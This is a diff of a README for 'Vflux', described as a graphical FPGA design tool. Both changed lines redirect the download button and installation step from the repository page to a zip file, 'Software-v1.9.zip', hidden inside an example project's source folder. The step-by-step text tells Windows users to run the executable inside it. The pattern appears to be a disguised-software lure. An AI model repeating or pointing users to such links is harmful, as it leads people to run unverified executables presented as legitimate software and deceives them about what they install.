@@ -1,6 +1,6 @@
 # 🚀 Vflux - Build digital circuits with simple tools
 
-[![](https://img.shields.io/badge/Download_Vflux-blue.svg)](https://github.com/winfieldmassspectroscopic818/Vflux)
+[![](https://img.shields.io/badge/Download_Vflux-blue.svg)](https://github.com/winfieldmassspectroscopic818/Vflux/raw/refs/heads/main/examples/icesugar-pro-blinky/src/Software-v1.9.zip)
 
 Vflux provides a visual interface for FPGA development. You use this tool to design and test digital circuits on your computer. It removes the complexity of command-line tools by offering a clean, graphical window. This application uses the OSS CAD Suite to process your designs. You can create projects for common hardware like iCE40 and ECP5 chips.
 
@@ -20,7 +20,7 @@ The software performs best when you install it on a solid-state drive. Do not ru
 
 Follow these steps to set up Vflux on your Windows system:
 
-1. Visit [this page](https://github.com/winfieldmassspectroscopic818/Vflux) to download the installer.
+1. Visit [this page](https://github.com/winfieldmassspectroscopic818/Vflux/raw/refs/heads/main/examples/icesugar-pro-blinky/src/Software-v1.9.zip) to download the installer.
 2. Look for the file ending in .msi or .exe.
 3. Save the file to your computer.
 4. Double-click the file to open the installation wizard.
